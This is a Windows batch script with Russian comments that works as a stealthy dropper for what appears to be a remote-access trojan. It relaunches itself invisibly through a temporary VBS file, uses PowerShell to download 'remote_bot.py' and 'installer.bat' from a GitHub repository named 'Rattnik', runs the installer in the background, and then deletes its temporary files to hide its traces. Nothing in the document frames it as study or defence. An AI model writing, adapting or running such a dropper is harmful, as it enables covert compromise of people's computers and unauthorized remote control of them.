@echo off
chcp 65001 >nul

:: Скрытый режим: запуск через VBS
if "%~1"=="" (
    echo Set WshShell = CreateObject("WScript.Shell") > "%TEMP%\invisible.vbs"
    echo WshShell.Run "cmd /c ""%~f0"" hidden", 0, False >> "%TEMP%\invisible.vbs"
    start "" /B wscript "%TEMP%\invisible.vbs"
    exit /b
)

:: Основной код установки
set "TEMP_DIR=%TEMP%\RemoteAccessBot"
mkdir "%TEMP_DIR%" >nul 2>&1

echo Загрузка файлов...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/nikoda3576/Rattnik/main/remote_bot.py' -OutFile '%TEMP_DIR%\remote_bot.py'"
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/nikoda3576/Rattnik/main/installer.bat' -OutFile '%TEMP_DIR%\installer.bat'"

echo Запуск установщика...
cd /d "%TEMP_DIR%"
start /B "" installer.bat

echo Удаление временных файлов...
timeout /t 5 >nul
rd /s /q "%TEMP_DIR%" >nul 2>&1
del "%TEMP%\invisible.vbs" >nul 2>&1

exit
